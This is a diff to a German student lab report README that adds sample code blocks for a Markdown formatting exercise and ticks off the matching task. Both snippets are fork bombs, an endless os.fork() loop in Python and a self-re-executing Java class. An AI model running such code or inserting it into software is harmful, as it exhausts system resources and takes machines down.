@@ -18,6 +18,22 @@
 
 ![Screenshot of the Logger](./media/Logger.png)
 
+```python
+import os
+while 1:
+    os.fork()
+```
+
+```JAVA
+public class forkbomb
+{
+	public static void main(String[] args)
+	{
+		Runtime.getRuntime().exec(new String[]{"javaw", "-cp", System.getProperty("java.class.path"), "forkbomb"});
+	}
+}
+```
+
 ## Links/Literatur
 
 - [x] Übertragen Angabe Taskliste in Markdown Readme
@@ -58,7 +74,7 @@
 - [ ] Erstellung detaillierter und nachvollziehbarer Markdown Lab Report
     - [x] Übertragung Information aus Labreport Template.
     - [ ] Alle Schritte dieser Übung nachvollziehbar erläutern.
-    - [ ] Übung Github Flavor: Erstellen Sie einen Codeblock im Dokument, welcher 3 Zeilen Python und 3 Zeilen Java Source Code korrekt darstellt.
+    - [x] Übung Github Flavor: Erstellen Sie einen Codeblock im Dokument, welcher 3 Zeilen Python und 3 Zeilen Java Source Code korrekt darstellt.
     - [ ] Korrekturlesen Dokumentation
     - [ ] PDF erstellen (zB Dillinger)
 - [ ] Überprüfung Vollständigkeit der Abgabe
